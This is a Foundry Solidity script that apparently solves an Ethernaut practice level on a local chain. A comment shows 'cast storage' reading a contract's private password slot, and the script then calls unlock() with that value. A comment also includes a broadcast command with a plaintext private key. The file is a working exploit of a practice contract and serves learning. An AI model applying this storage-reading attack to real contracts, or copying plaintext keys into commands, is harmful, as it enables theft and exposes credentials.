// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function unlock(bytes32 _password) external;
    function locked() external view returns(bool);
}
contract SolveScript is Script {
    address public target = 0x763e69d24a03c0c8B256e470D9fE9e0753504D07;

    function setUp() public {}

    /*
        hojunghan@hojungui-MacBookPro ethernaut-solve-using-foundry % cast storage --rpc-url http://localhost:8545 0x763e69d24a03c0c8B256e470D9fE9e0753504D07 1
        Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment.

        0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        A very strong secret password :)

    */
    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
        console.logBool(ITarget(target).locked());
        ITarget(target).unlock(password);
        console.logBool(ITarget(target).locked());
        vm.stopBroadcast();
    }
}
